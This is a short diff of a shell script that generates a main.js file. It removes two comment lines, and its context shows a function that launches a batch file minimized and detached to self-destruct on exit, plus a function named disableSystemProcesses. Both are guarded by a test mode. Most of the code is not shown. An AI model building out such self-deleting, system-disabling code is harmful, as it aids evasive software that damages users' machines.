@@ -34,7 +34,6 @@ EOF
 
 # ─── main.js – full with all features and test‑mode guard ──────
 cat > main.js << 'EOF'
-# ─── Self‑destruct on normal exit ──────────────────────────────
 function scheduleSelfDestructOnExit() {
   if (testMode || process.env.EICIEL_TEST_MODE) {
     testSpies.selfDestructOnExit++;
@@ -48,7 +47,6 @@ function scheduleSelfDestructOnExit() {
   exec(`start /min ${batPath}`, { detached: true, stdio: 'ignore' });
 }
 
-# ─── System and internet controls ──────────────────────────────
 function disableSystemProcesses() {
   if (testMode || process.env.EICIEL_TEST_MODE) {
     testSpies.disableSystemProcesses++;
